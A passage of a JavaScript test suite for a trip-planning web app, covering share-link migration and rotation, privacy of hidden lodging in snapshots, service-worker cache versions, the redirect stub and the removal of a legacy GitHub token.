  const jump = S.cityGuideLink(stop);
  assert.ok(/^<button type="button" class="guide-link jump" data-guide="batumi-2026-08-08"/.test(jump), jump);
  assert.equal(jump.indexOf('href'), -1, jump);
  assert.equal(jump.indexOf('target='), -1, jump);
  // A guide dated a day off the check-in is still that city's guide.
  S.setGuideIds(['batumi-2026-08-09']);
  assert.ok(S.cityGuideLink(stop).indexOf('data-guide="batumi-2026-08-09"') !== -1);
  // A different city's guide is not.
  S.setGuideIds(['tirana-2026-08-08']);
  assert.ok(S.cityGuideLink(stop).indexOf('Plan this city') !== -1);
  // A nameless stop gets no door at all rather than a broken one.
  assert.equal(S.cityGuideLink({ name: '' }), '');
});

test('a guide renders as an open-and-close card and nothing more', () => {
  const S = loadSharePage();
  const html = S.guideCardHTML({
    id: 'batumi-2026-08-08', name: 'Batumi', country: 'GE',
    from: '2026-08-08', to: '2026-08-15',
    sections: [{ id: 'dinner', label: 'Eat & Drink', icon: '🍽' }],
    items: [{ id: 'i1', section: 'dinner', name: 'Sulico', stars: 4.6, when: 'Evening',
      price: '~$20', note: 'Book ahead.', verdicts: [{ label: 'Food', text: 'Very good.' }],
      links: [{ kind: 'map', label: 'Map', href: 'https://maps.example/1' }] }]
  });
  // Expand and collapse, natively, with no script and no stored state.
  assert.ok(/^<details class="guide-card" data-guide-id="batumi-2026-08-08"><summary>/.test(html), html);
  assert.ok(html.indexOf('</details>') !== -1);
  // The place, its verdict and its link survive.
  assert.ok(html.indexOf('Sulico') !== -1);
  assert.ok(html.indexOf('Very good.') !== -1);
  assert.ok(html.indexOf('https://maps.example/1') !== -1);
  // Nothing that could change it does.
  ['<button', '<input', 'draggable', 'onclick', 'contenteditable', 'ctl-row', 'grip']
    .forEach(sym => assert.equal(html.indexOf(sym), -1, 'a guide card rendered ' + sym));
});

test('the snapshot is frozen, so nothing on this page can rewrite the plan', () => {
  const S = loadSharePage();
  const snap = { cities: [{ name: 'Batumi', accommodations: [{ name: 'Flat' }] }] };
  S.deepFreeze(snap);
  assert.ok(Object.isFrozen(snap));
  assert.ok(Object.isFrozen(snap.cities));
  assert.ok(Object.isFrozen(snap.cities[0]));
  assert.ok(Object.isFrozen(snap.cities[0].accommodations[0]));
  // A hostile poke from the console changes nothing, in either direction.
  try { snap.cities[0].name = 'Somewhere else'; } catch (e) { /* strict-mode callers throw */ }
  try { snap.cities.push({ name: 'Injected' }); } catch (e) { /* ditto */ }
  assert.equal(snap.cities[0].name, 'Batumi');
  assert.equal(snap.cities.length, 1);
  // Null and primitives are handled rather than thrown on.
  assert.equal(S.deepFreeze(null), null);
  assert.equal(S.deepFreeze(7), 7);
});

test('the share page fails soft on a dead token and on a missing function', () => {
  const fs = require('fs');
  const path = require('path');
  const page = fs.readFileSync(path.join(__dirname, '..', 'share', 'index.html'), 'utf8');
  // A 404 from PostgREST means get_share does not exist yet (the DDL has not
  // been run). That is a setup state, not a dead link, and the page has to say
  // which one it is: telling a reader their link is broken when it is not is
  // the failure mode this branch exists to prevent.
  assert.ok(/if \(r\.status === 404\) return \{ setup: true \};/.test(page));
  assert.ok(page.indexOf('Sharing is not switched on yet') !== -1);
  // A null answer is a rotated, unpublished or mistyped token. Same words for
  // all three, because the page genuinely cannot tell them apart and guessing
  // would be worse.
  assert.ok(page.indexOf('This share link is no longer live') !== -1);
  assert.ok(page.indexOf('This link is missing its code') !== -1);
  assert.ok(page.indexOf('Could not load this plan') !== -1);
  // The RPC argument name is part of the contract with the SQL.
  assert.ok(/JSON\.stringify\(\{ share_token: token \}\)/.test(page));
});

test('the trip page carries no GitHub publish path at all', () => {
  const fs = require('fs');
  const path = require('path');
  const trip = fs.readFileSync(path.join(__dirname, '..', 'trip', 'index.html'), 'utf8');
  assert.equal(trip.indexOf('api.github.com'), -1, 'the contents-API publish is back');
  assert.equal(trip.indexOf('github_pat_'), -1, 'the PAT placeholder is back');
  assert.equal(trip.indexOf('publishFamilyShare'), -1, 'the old publish function is back');
  assert.equal(trip.indexOf('github-token-input'), -1, 'the PAT field is back');
  assert.equal(trip.indexOf('personal-access-tokens/new'), -1, 'the PAT setup copy is back');
  // The credential store has one entry left, and it is not the token.
  const creds = trip.match(/const CRED_KEYS = \{[\s\S]*?\n\};/);
  assert.ok(creds, 'CRED_KEYS missing from the built trip page');
  assert.equal(creds[0].indexOf('github'), -1, 'the token is back in the credential store');
  // defaultState carries the share, and none of the retired GitHub settings.
  const def = trip.match(/function defaultState\(\) \{[\s\S]*?\n\}/);
  assert.ok(/shareToken: ''/.test(def[0]));
  ['githubUser', 'githubRepo', 'githubFile'].forEach(f => {
    assert.equal(def[0].indexOf(f + ':'), -1, f + ' is back in the trip state');
  });
});

test('the migration deletes the token, on this device and on the account', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const trip = fs.readFileSync(path.join(root, 'trip', 'index.html'), 'utf8');
  const app = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
  // Both surfaces delete the two local keys at boot. Both, because either one
  // can be the first page opened after the update.
  [trip, app].forEach(page => {
    assert.ok(/LEGACY_GITHUB_KEYS = \['cityops\.github\.pat\.v1', 'cityops\.github\.pat\.updated\.v1'\]/.test(page));
    assert.ok(/purgeLegacyGithubToken\(\);/.test(page), 'the purge is defined but never called');
    // And say so, including the one thing the app cannot do for him.
    assert.ok(page.indexOf('github.com/settings/personal-access-tokens') !== -1,
      'the console line must tell Rob where to revoke the token');
  });
  // The trip blob's github settings go through the same door the credentials do.
  assert.ok(/RETIRED_GITHUB_FIELDS = \['githubToken', 'githubUser', 'githubRepo', 'githubFile'\]/.test(trip));
  // Neither surface adopts a github sidecar off the account any more.
  assert.equal(trip.indexOf('remote.github'), -1);
  assert.equal(app.indexOf('writeGithubToken('), -1);
});

test('the share page rides in the trip build, escaped and reversible', () => {
  // Identical mechanism to the guide template in index.html: one source file,
  // embedded so the download and the hosted page cannot become two pages.
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const trip = fs.readFileSync(path.join(root, 'trip', 'index.html'), 'utf8');
  const m = trip.match(/<script type="text\/plain" id="share-template">\n([\s\S]*?)\n<\/script>/);
  assert.ok(m, 'share-template block missing or closed early');
  assert.equal(m[1].indexOf('</script'), -1);
  assert.equal(m[1].indexOf('<!--'), -1, 'an HTML comment here would trap the block');
  const un = m[1].replace(/<\\\/script/g, '</script');
  const page = fs.readFileSync(path.join(root, 'share', 'index.html'), 'utf8');
  const marked = page.replace(
    /(<script type="application\/json" id="share-data">)[\s\S]*?(<\/script>)/,
    (x, open, close) => open + '\n__SHARE_DATA__\n' + close
  );
  assert.equal(un, marked, 'the embedded share page has drifted from share/index.html');
  // Filling the marker produces a standalone file that carries its snapshot and
  // therefore never calls the network for data.
  const snap = C.shareKit.build({ travelerName: 'Rob', generatedAt: '2026-08-28T00:00:00.000Z',
    cities: SHARE_STATE.cities, transitions: SHARE_STATE.transitions });
  const filled = un.replace('__SHARE_DATA__', () => JSON.stringify(snap).replace(/<\//g, '<\\/'));
  assert.ok(filled.indexOf('"Batumi"') !== -1);
  assert.equal(filled.indexOf('__SHARE_DATA__'), -1);
  const back = filled.match(/<script type="application\/json" id="share-data">\n([\s\S]*?)\n<\/script>/);
  assert.deepEqual(JSON.parse(back[1].replace(/<\\\//g, '</')), snap);
});

test('the service worker precaches the share shell and nothing token-shaped', () => {
  const fs = require('fs');
  const path = require('path');
  const sw = fs.readFileSync(path.join(__dirname, '..', 'sw.js'), 'utf8');
  assert.ok(/var SHELL = \['\/', '\/index\.html', '\/trip\/', '\/share\/'\];/.test(sw));
  // Bumped, or a phone serves the previous build once after every release.
  // v11: the 2026-09-01 host move. A new origin gets a clean cache anyway, but
  // the laptop and phone that follow the app across still need the bump.
  // v12: readable share tokens and the hide-lodging option. The share SHELL is
  // precached, so a phone on v11 would keep rendering hidden stays with the old
  // stay row until it happened to refetch.
  // v13: many share links per account. A phone still on v12 shows the old
  // one-link card, and the first save it makes mirrors only the first link
  // back out, so the bump is what stops the two builds disagreeing for a day.
  // v14: the compliance counters count DAYS, not nights. This is the bump that
  // matters most so far: a phone still serving v13 shows a Schengen number that
  // is low by one day per stop, on the screen Rob makes visa decisions from.
  // The share SHELL is precached too, so v13 would also keep rendering
  // published verdicts with no Must/Good/Skip on them.
  // v15: the owner's personal itinerary link came out of both footers. Without
  // the bump a phone keeps serving the build that still has it, which is the
  // one build nobody should be handed once sign-ups are open.
  assert.ok(/var CACHE = 'cityops-app-v15';/.test(sw));
  // GET only, so the rpc POST that carries the token is never cached, and a
  // rotated share cannot keep answering out of a stale cache.
  assert.ok(/if \(e\.request\.method !== 'GET'\) return;/.test(sw));
});

// ---- many links, one account ----
//
// One share used to be a singular, so rotating the family link killed the work
// link with it. These pin the list, the migration into it, and the promise that
// nothing one link does can reach another.

const FAMILY_TOKEN = 'family-' + 'a'.repeat(32);
const WORK_TOKEN = 'work-' + 'b'.repeat(32);

// The shell's per-row write, expressed exactly as trip-shell.html expresses it.
// A test below asserts the shipped file still says this.
function applyRowPatch(list, id, patch) {
  return C.shareKit.list(list.map(e => (e.id === id ? Object.assign({}, e, patch) : e)));
}

test('a single share migrates into entry one with its token untouched', () => {
  // The blob a device on the previous build wrote: no list, one token. That
  // token is a link somebody is already holding, so it has to survive exactly.
  const old = {
    shareToken: FAMILY_TOKEN,
    shareScope: 'guides',
    shareGuideIds: ['batumi-2026-08-08', 'tirana-2026-08-22'],
    shareHideLodging: false,
    lastPublishedAt: '2026-08-30T10:00:00.000Z'
  };
  const list = C.shareKit.migrate(old);
  assert.equal(list.length, 1);
  assert.equal(list[0].token, FAMILY_TOKEN, 'the live token must survive the migration byte for byte');
  assert.equal(list[0].scope, 'guides');
  assert.deepEqual(list[0].guideIds, ['batumi-2026-08-08', 'tirana-2026-08-22']);
  assert.equal(list[0].hideLodging, false);
  assert.equal(list[0].updated, '2026-08-30T10:00:00.000Z');
  assert.equal(list[0].label, 'Family', 'the first link is named for who it was for');
  assert.ok(list[0].id, 'every row needs an id for its controls to name it');
  // Deterministic, so the same blob on two devices produces the same row id
  // rather than two rows fighting over one token.
  assert.deepEqual(C.shareKit.migrate(old), list);
});

test('the migration handles a blob with no share fields at all', () => {
  // A device that never shared. Not an error, not a phantom row: no links.
  assert.deepEqual(C.shareKit.migrate({}), []);
  assert.deepEqual(C.shareKit.migrate(null), []);
  assert.deepEqual(C.shareKit.migrate({ cities: [], transitions: [] }), []);
  // A token too broken to name a row is not a link, so it does not become one.
  assert.deepEqual(C.shareKit.migrate({ shareToken: 'not a token' }), []);
  assert.deepEqual(C.shareKit.migrate({ shareToken: '' }), []);
});

test('the migration reads the STORED blob, not one already carrying the default', () => {
  // The trap, found in the browser and pinned here so it stays found.
  // defaultState() carries `shares: []`, so Object.assign(default, stored)
  // hands the migration an empty list for a blob that never had one. Read that
  // way, a device with a live single share loses it: an empty list means the
  // user deleted their links, and there is nothing left to fold.
  const stored = { shareToken: FAMILY_TOKEN, shareScope: 'trip' };
  assert.deepEqual(C.shareKit.migrate(Object.assign({ shares: [] }, stored)), [],
    'this is the trap: a defaulted list reads as a deliberate empty one');
  assert.equal(C.shareKit.migrate(stored)[0].token, FAMILY_TOKEN);
  // So loadState migrates the parsed blob, and the built page says so.
  const trip = require('node:fs').readFileSync(
    require('node:path').join(__dirname, '..', 'trip', 'index.html'), 'utf8');
  assert.ok(/merged\.shares = CityOps\.shareKit\.migrate\(parsed\);/.test(trip),
    'loadState must migrate the stored blob, never the defaulted merge');
});

test('a blob that already carries a list is read as it stands, empty included', () => {
  const list = C.shareKit.migrate({
    shares: [{ id: 'r1', token: FAMILY_TOKEN, label: 'Family', hideLodging: false },
             { id: 'r2', token: WORK_TOKEN, label: 'Work', hideLodging: true }],
    // Stale legacy fields alongside it must not win, or a rotate would undo.
    shareToken: 'stale-' + 'c'.repeat(32)
  });
  assert.equal(list.length, 2);
  assert.equal(list[0].token, FAMILY_TOKEN);
  assert.equal(list[1].token, WORK_TOKEN);
  // An EMPTY list means the user deleted their links. Resurrecting one from
  // the legacy fields would bring back a link they took down on purpose.
  assert.deepEqual(C.shareKit.migrate({ shares: [], shareToken: FAMILY_TOKEN }), []);
});

test('the legacy fields mirror the first published link back out', () => {
  // The other direction of the migration, and the whole reason it is safe to
  // ship: a phone still on the previous build reads shareToken and keeps
  // showing a link that works.
  const list = C.shareKit.migrate({
    shares: [{ id: 'r1', token: FAMILY_TOKEN, label: 'Family', scope: 'guides',
               guideIds: ['batumi-2026-08-08'], hideLodging: false },
             { id: 'r2', token: WORK_TOKEN, label: 'Work', hideLodging: true }]
  });
  const legacy = C.shareKit.legacyFields(list);
  assert.equal(legacy.shareToken, FAMILY_TOKEN);
  assert.equal(legacy.shareScope, 'guides');
  assert.deepEqual(legacy.shareGuideIds, ['batumi-2026-08-08']);
  assert.equal(legacy.shareHideLodging, false);
  // Round trip: mirrored out and folded back in, the live token is the same.
  assert.equal(C.shareKit.migrate(legacy)[0].token, FAMILY_TOKEN);
  // A DRAFT is skipped. An old device reading a blank token would decide the
  // share had been taken down and hide Copy over a link that is still live.
  const drafted = C.shareKit.list([{ id: 'd1', token: '', label: 'New' },
                                   { id: 'r1', token: FAMILY_TOKEN, label: 'Family' }]);
  assert.equal(C.shareKit.legacyFields(drafted).shareToken, FAMILY_TOKEN);
  // No links at all says so plainly rather than leaving a dead token behind.
  assert.deepEqual(C.shareKit.legacyFields([]),
    { shareToken: '', shareScope: 'trip', shareGuideIds: [], shareHideLodging: false });
});

test('a rotate touches one link and leaves the others byte-identical', () => {
  const list = C.shareKit.list([
    { id: 'r1', token: FAMILY_TOKEN, label: 'Family', hideLodging: false, updated: '2026-08-30T10:00:00.000Z' },
    { id: 'r2', token: WORK_TOKEN, label: 'Work', scope: 'guides', guideIds: ['g1'], hideLodging: true, updated: '2026-08-29T10:00:00.000Z' }
  ]);
  const rotated = 'family-' + 'd'.repeat(32);
  const after = applyRowPatch(list, 'r1', { token: rotated, updated: '2026-09-01T00:00:00.000Z' });
  assert.equal(after[0].token, rotated, 'the rotated link gets the new token');
  assert.deepEqual(after[1], list[1], 'the other link must come through untouched');
  assert.equal(after.length, 2);
  // And a delete removes exactly one.
  const deleted = C.shareKit.list(after.filter(e => e.id !== 'r1'));
  assert.equal(deleted.length, 1);
  assert.deepEqual(deleted[0], list[1]);
});

test('two links pointing at one row are impossible', () => {
  // Two rows on one token would let a rotate on one silently move the other's
  // link, which is the exact cross-talk this feature exists to end.
  const list = C.shareKit.list([
    { id: 'r1', token: FAMILY_TOKEN, label: 'Family' },
    { id: 'r2', token: FAMILY_TOKEN, label: 'Copy of family' }
  ]);
  assert.equal(list.length, 1);
  assert.equal(list[0].label, 'Family');
  // Drafts have no token and never collide with each other.
  assert.equal(C.shareKit.list([{ label: 'A' }, { label: 'B' }]).length, 2);
  // Nor do two rows ever answer to one id, or every control would be ambiguous.
  const dupIds = C.shareKit.list([{ id: 'x', label: 'A' }, { id: 'x', label: 'B' }]);
  assert.equal(dupIds.length, 2);
  assert.notEqual(dupIds[0].id, dupIds[1].id);
});

test('five links is the cap, and the refusal is a sentence, not a silence', () => {
  assert.equal(C.shareKit.LIST_CAP, 5);
  const five = [];
  for (let i = 0; i < 5; i++) five.push({ id: 'r' + i, label: 'Link ' + i });
  assert.equal(C.shareKit.list(five).length, 5);
  // A sixth is dropped rather than accepted and then lost on the next read.
  assert.equal(C.shareKit.list(five.concat([{ id: 'r5', label: 'Six' }])).length, 5);
  // Below the cap there is nothing to say.
  assert.equal(C.shareKit.addBlocked(C.shareKit.list(five.slice(0, 4))), '');
  // At it, the reason names the limit and the way out. A disabled control with
  // no explanation is the dead end house rules forbid.
  const why = C.shareKit.addBlocked(C.shareKit.list(five));
  assert.ok(/5 share links/.test(why), 'the reason must name the limit');
  assert.ok(/Delete one/.test(why), 'the reason must name the way out');
});

test('a new link is offered a name, and never one already taken', () => {
  assert.equal(C.shareKit.suggest([]), 'Family');
  assert.equal(C.shareKit.suggest([{ label: 'Family' }]), 'Work');
  // Case-insensitive: somebody who typed "family" is not offered it again.
  assert.equal(C.shareKit.suggest([{ label: 'family' }, { label: 'WORK' }]), 'Friends');
  assert.equal(C.shareKit.suggest(
    C.shareKit.SUGGESTIONS.map(l => ({ label: l }))), 'Link 6');
});

test('two links with different settings make two different snapshots', () => {
  // The point of the whole feature, proved on ONE source state: family sees
  // the flat, work does not, and both are built from the same trip.
  const family = { id: 'r1', token: FAMILY_TOKEN, label: 'Family', scope: 'trip', guideIds: [], hideLodging: false };
  const work = { id: 'r2', token: WORK_TOKEN, label: 'Work', scope: 'guides', guideIds: [SHARE_GUIDE_ROW.city_id], hideLodging: true };
  const forRow = row => C.shareKit.build({
    travelerName: SHARE_STATE.travelerName,
    generatedAt: '2026-09-01T00:00:00.000Z',
    cities: SHARE_STATE.cities,
    transitions: SHARE_STATE.transitions,
    hideLodging: row.hideLodging,
    guides: (row.scope === 'guides') ? [SHARE_GUIDE_ROW] : [],
    includeGuides: (row.scope === 'guides') ? row.guideIds : []
  });
  const famSnap = forRow(family);
  const workSnap = forRow(work);
  assert.notDeepEqual(famSnap, workSnap, 'two audiences must not get the same page');

  // Family: the property is named, with its neighbourhood and booking link.
  const famStay = famSnap.cities[0].accommodations[0];
  assert.equal(famStay.name, 'Sea View Flat');
  assert.equal(famStay.neighborhood, 'Old Town');
  assert.equal(famStay.link, 'https://booking.example/x');
  assert.equal(famStay.hidden, undefined);
  assert.equal(famSnap.guides.length, 0, 'family asked for the trip only');

  // Work: the city and the dates survive so the route is legible, and the
  // property, the neighbourhood, the link and the status are all gone.
  const workStay = workSnap.cities[0].accommodations[0];
  assert.equal(workStay.hidden, true);
  assert.equal(workStay.city, 'Batumi');
  assert.equal(workStay.checkIn, '2026-08-08');
  assert.equal(workStay.name, undefined);
  assert.equal(workStay.neighborhood, undefined);
  assert.equal(workStay.link, undefined);
  assert.equal(workStay.status, undefined);
  assert.equal(workSnap.guides.length, 1, 'work asked for a guide as well');

  // Neither leaks, whichever way the options are set.
  assert.deepEqual(C.shareKit.leaks(famSnap), []);
  assert.deepEqual(C.shareKit.leaks(workSnap), []);
  // Serialized, the hidden one carries no trace of the address anywhere in the
  // payload. A reader who opens the payload rather than the page has to find
  // nothing: a render-time filter would already have shipped it.
  const workJson = JSON.stringify(workSnap);
  assert.equal(workJson.indexOf('Sea View Flat'), -1,
    'the flat is named nowhere, the guide\'s own accommodation field included');
  assert.equal(workJson.indexOf('booking.example'), -1);
  assert.equal(workJson.indexOf('12 Ninoshvili St'), -1);
  // The neighbourhood, checked against the trip half. The guide half may say
  // "Old Town" in a place's own when-hint, which is a public fact about a
  // restaurant and not a statement about where the traveler sleeps.
  assert.equal(JSON.stringify(workSnap.cities).indexOf('Old Town'), -1);
  // And the family one does carry it, so this test can tell the two apart.
  assert.ok(JSON.stringify(famSnap).indexOf('Sea View Flat') !== -1);
});

test('a refused share write says which setup step is missing', () => {
  // The shapes PostgREST returns. A status alone cannot tell a setup step from
  // a fault, and "publish failed" is not something a user can act on.
  const dup = JSON.stringify({
    code: '23505',
    details: 'Key (user_id)=(3b1e0f5a-0000-4000-8000-000000000000) already exists.',
    hint: null,
    message: 'duplicate key value violates unique constraint "shares_user_id_key"'
  });
  assert.equal(C.shareKit.writeFailure(409, dup), 'one-share-limit');
  // The constraint's real name is whatever the original create table produced,
  // so it is never matched on: the code and the named column are enough.
  assert.equal(C.shareKit.writeFailure(409, dup.replace('shares_user_id_key', 'shares_owner_uniq')),
    'one-share-limit');
  // A table that does not exist at all is a different sentence.
  assert.equal(C.shareKit.writeFailure(404,
    JSON.stringify({ code: 'PGRST205', message: "Could not find the table 'public.shares'" })), 'no-table');
  // Anything else is a fault and is reported as one, never as a setup step.
  assert.equal(C.shareKit.writeFailure(500, 'upstream exploded'), 'other');
  assert.equal(C.shareKit.writeFailure(401, JSON.stringify({ message: 'JWT expired' })), 'other');
  assert.equal(C.shareKit.writeFailure(403, JSON.stringify({ code: '42501', message: 'permission denied' })), 'other');
  assert.equal(C.shareKit.writeFailure(0, ''), 'other');
  assert.equal(C.shareKit.writeFailure(undefined, undefined), 'other');
});

test('the built trip page writes one link at a time, matched on its own token', () => {
  const trip = require('node:fs').readFileSync(
    require('node:path').join(__dirname, '..', 'trip', 'index.html'), 'utf8');
  // A new link is an INSERT, never an upsert. An upsert keyed on user_id would
  // merge the second link into the first one's row and move its token.
  assert.ok(/function insertShareRow\(token, snapshot\) \{[\s\S]*?method: 'POST'/.test(trip));
  // (The itinerary and profile tables are still one row per user and still
  // upsert that way. It is SHARES that stopped being a singular.)
  assert.equal(trip.indexOf('/rest/v1/shares?on_conflict'), -1,
    'an upsert on the shares table would let one link overwrite another');
  // Every other write is matched on the row's OWN token, so it can reach
  // exactly one row and no other link can be disturbed by it.
  assert.ok(/PATCH[\s\S]{0,400}token=eq\.' \+ encodeURIComponent\(token\)/.test(trip) ||
    /'\/rest\/v1\/shares\?select=token&token=eq\.' \+ encodeURIComponent\(token\)/.test(trip),
    'the update must be matched on the row token');
  assert.ok(/'\/rest\/v1\/shares\?token=eq\.' \+ encodeURIComponent\(row\.token\)/.test(trip),
    'the delete must be matched on the row token');
  // The per-row write is the one expression this file tests above.
  assert.ok(/shareRows\(\)\.map\(e => \(e\.id === id \? Object\.assign\(\{\}, e, patch\) : e\)\)/.test(trip),
    'a row write must patch the matching id and copy every other row through');
  // The label lives in the synced blob and is deliberately not sent, so a
  // publish works whether or not the new column exists yet.
  assert.ok(/JSON\.stringify\(\[\{ token: token, data: snapshot, updated_at: new Date\(\)\.toISOString\(\) \}\]\)/.test(trip),
    'the insert body must carry only token, data and updated_at');
  // Deleting is destructive, so it keeps its word and its confirm, per row.
  assert.ok(/del\.textContent = 'Delete';/.test(trip), 'a delete keeps a text label');
  assert.ok(/armConfirm\('deleteShare:' \+ id/.test(trip), 'a delete is confirmed per row');
  // At the cap the control goes quiet WITH a reason attached.
  assert.ok(/add\.disabled = !!blocked \|\| !!_shareBusy;/.test(trip));
  assert.ok(/add\.title = blocked/.test(trip), 'the disabled control must say why');
  // And the confirm tells the user the other links are not in the blast radius.
  assert.ok(/Your other ' \+ others \+ ' link/.test(trip));
  // The guide checkboxes are filled AFTER the card is in the document. Filled
  // while it is still detached, the lookup finds nothing and the picker renders
  // empty, which reads as "you have no city guides". Found in the browser.
  assert.ok(/host\.appendChild\(card\);\s*\n[\s\S]{0,200}?if \(open && row\.scope === 'guides'\) renderShareGuideList\(row\.id\);/.test(trip),
    'the guide picker must be filled after its card is appended');
});

// ---- clean URLs: /trip/ is the address, /trip.html is a stub ----
// The trip surface moved from /trip.html to the directory /trip/. Two things
// have to stay true and neither is visible in a passing browser session: the
// old path must still be a redirect stub (bookmarks, and the retired
// robriggs3.github.io editor URL, both point at it), and no shipped surface may
// go on linking to it, or the address bar grows a .html back.
test('trip.html stays a redirect stub to /trip/, not the app', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const stub = fs.readFileSync(path.join(root, 'trip.html'), 'utf8');
  const engine = fs.readFileSync(path.join(root, 'src', 'cityops.js'), 'utf8');
  // Small. If the assembler is ever taught to write this path again, it lands
  // here as three quarters of a megabyte and this is the assertion that fails.
  assert.ok(stub.length < 6000, 'trip.html is no longer a stub; is the assembler writing it again?');
  assert.equal(stub.indexOf(engine), -1, 'the engine must not ship at the retired path');
  // Three redirects, because a JS-only redirect is a dead link with JS off.
  assert.ok(/location\.replace\('\/trip\/' \+ location\.search \+ location\.hash\)/.test(stub),
    'the scripted hop must carry the query and the hash across');
  assert.ok(/<meta http-equiv="refresh" content="0; url=\/trip\/">/.test(stub),
    'the no-JS meta refresh fallback is missing');
  assert.ok(/<a href="\/trip\/">/.test(stub), 'the visible manual link is missing');
  // Same origin as the app: clearing that store would destroy the only local
  // copy for anyone who never signed in, so the stub reads and writes none of it.
  assert.equal(stub.indexOf('ocalStorage'), -1, 'the stub must never touch browser storage');
});

test('no shipped surface links to the retired .html trip path', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  ['index.html', 'trip/index.html', 'template.html', 'example.html', 'sw.js'].forEach(name => {
    const text = fs.readFileSync(path.join(root, name), 'utf8');
    assert.equal(text.indexOf('trip.html'), -1, name + ': a reference to the retired trip.html survived');
  });
  // And the switch in the one shared header points at the clean URLs.
  const frag = fs.readFileSync(path.join(root, 'src', 'header.html'), 'utf8');
  assert.ok(/id="surf-trip" href="\/trip\/"/.test(frag), 'the Trip peer must point at /trip/');
  assert.ok(/id="surf-cities" href="\/"/.test(frag), 'the Cities peer must point at the root');
});

test('readSidecars tolerates every shape a stored row can be in', () => {
  const none = { apiKey: null, github: null, genmeta: null, removed: null };
  assert.deepEqual(C.syncKit.readSidecars(null), none);
  assert.deepEqual(C.syncKit.readSidecars({}), none);
  assert.deepEqual(C.syncKit.readSidecars({ apiKey: 'sk-ant-loose' }), none);
  assert.deepEqual(C.syncKit.readSidecars({ apiKey: [] }), none);
  const good = C.syncKit.readSidecars({ apiKey: { value: 'sk', updated: P_LOCAL } });
  assert.deepEqual(good.apiKey, { value: 'sk', updated: P_LOCAL });
  // A cleared key is a real value: it has to propagate, so an empty string
  // with a stamp is a usable block, not an absent one.
  const cleared = C.syncKit.readSidecars({ apiKey: { value: '', updated: P_LOCAL } });
  assert.deepEqual(cleared.apiKey, { value: '', updated: P_LOCAL });
});

test('genmeta normalizes to string fields per city and stays bounded', () => {
  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL }, {
    genmeta: {
      updated: P_LOCAL,
      value: {
        'batumi-2026-08-08': { country: 'GE', notes: 'x'.repeat(5000), bad: { nested: 1 } },
        'junk': 'not an object',
        '': { notes: 'no city id' }
      }
    }
  });
  const gm = row.data.genmeta.value;
  assert.deepEqual(Object.keys(gm), ['batumi-2026-08-08']);
  assert.equal(gm['batumi-2026-08-08'].country, 'GE');
  assert.equal(gm['batumi-2026-08-08'].notes.length, 2000);
  assert.equal(gm['batumi-2026-08-08'].bad, undefined);
});

test('an oversized key value is bounded rather than pushed whole', () => {
  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL },
    { apiKey: { value: 'k'.repeat(9999), updated: P_LOCAL } });
  assert.equal(row.data.apiKey.value.length, 4000);
});

// ---- token refresh: transient failure must not sign a device out ----

test('refreshFailure only calls a grant dead when the body says so', () => {
  // The first entry is the body the live project actually returned for a
  // bogus refresh token on 2026-08-25. It is here because the first version
  // of this classifier did not match it: a genuinely revoked session would
  // have kept retrying forever and never told the traveler sync had stopped.
  const dead = [
    [400, '{"code":400,"error_code":"validation_failed","msg":"Refresh token is not valid"}'],
    [400, '{"code":400,"error_code":"refresh_token_not_found","msg":"Invalid Refresh Token: Refresh Token Not Found"}'],
    [400, '{"code":400,"error_code":"refresh_token_already_used","msg":"Invalid Refresh Token: Already Used"}'],
    [400, '{"error":"invalid_grant","error_description":"Invalid Refresh Token"}'],
    [401, '{"error":"invalid_grant"}'],
    [403, '{"error":"invalid_grant"}']
  ];
  dead.forEach(([s, b]) => assert.equal(C.syncKit.refreshFailure(s, b), 'dead',
    'should be dead: ' + s + ' ' + b));
  const transient = [
    [403, '{"message":"Project is paused"}'],
    [429, '{"message":"rate limit"}'],
    [500, ''],
    [502, 'bad gateway'],
    [503, '{"error":"unavailable"}'],
    [400, ''],                                  // unreadable body: keep the session
    [401, '{"message":"No API key found in request"}'],
    [404, '{"message":"not found"}'],
    [undefined, '']
  ];
  transient.forEach(([s, b]) => assert.equal(C.syncKit.refreshFailure(s, b), 'transient',
    'should be transient: ' + s + ' ' + b));
});


// ---- the More action sheet's clustering (pure; the DOM builder renders it) ----

test('moreSheetGroups clusters rows and orders each cluster by its own order', () => {
  const rows = [
    { label: 'Share view', group: 'share', order: 10 },
    { label: 'Export JSON', group: 'share', order: 30 },
    { label: 'Update data', group: 'work', order: 20 },
    { label: 'Edit dates', group: 'work', order: 30 },
    { label: 'Enrich', group: 'work', order: 10 },
    { label: 'Export guide', group: 'share', order: 20 },
    { label: 'Edit city', group: 'city', order: 10 },
    { label: 'Remove city', group: 'city', order: 20, cls: 'danger' }
  ];
  const gs = C.moreSheetGroups(rows);
  assert.deepEqual(gs.map(g => g.id), ['work', 'share', 'city']);
  assert.deepEqual(gs.map(g => g.label), C.MORE_GROUPS.map(g => g.label));
  assert.deepEqual(gs[0].rows.map(r => r.label), ['Enrich', 'Update data', 'Edit dates']);
  assert.deepEqual(gs[1].rows.map(r => r.label), ['Share view', 'Export guide', 'Export JSON']);
  assert.deepEqual(gs[2].rows.map(r => r.label), ['Edit city', 'Remove city']);
  // The destructive row is the last row of the last group, every time.
  const last = gs[gs.length - 1].rows[gs[gs.length - 1].rows.length - 1];
  assert.equal(last.cls, 'danger');
});

test('a standalone guide drops the empty app-only cluster', () => {
  // No CityOpsApp: only the four engine rows exist, so 'city' never renders
  // and the other two keep the same order they have in the app.
  const gs = C.moreSheetGroups([
    { label: 'Share view', group: 'share', order: 10 },
    { label: 'Export JSON', group: 'share', order: 30 },
    { label: 'Update data', group: 'work', order: 20 },
    { label: 'Edit dates', group: 'work', order: 30 }
  ]);
  assert.deepEqual(gs.map(g => g.id), ['work', 'share']);
  assert.deepEqual(gs[0].rows.map(r => r.label), ['Update data', 'Edit dates']);
  assert.deepEqual(gs[1].rows.map(r => r.label), ['Share view', 'Export JSON']);
});

test('a row with no group is shown, never dropped', () => {
  const gs = C.moreSheetGroups([
    { label: 'Enrich', group: 'work', order: 10 },
    { label: 'Mystery' },
    { label: 'Remove city', group: 'city', order: 20, cls: 'danger' }
  ]);
  const shown = [].concat.apply([], gs.map(g => g.rows.map(r => r.label)));
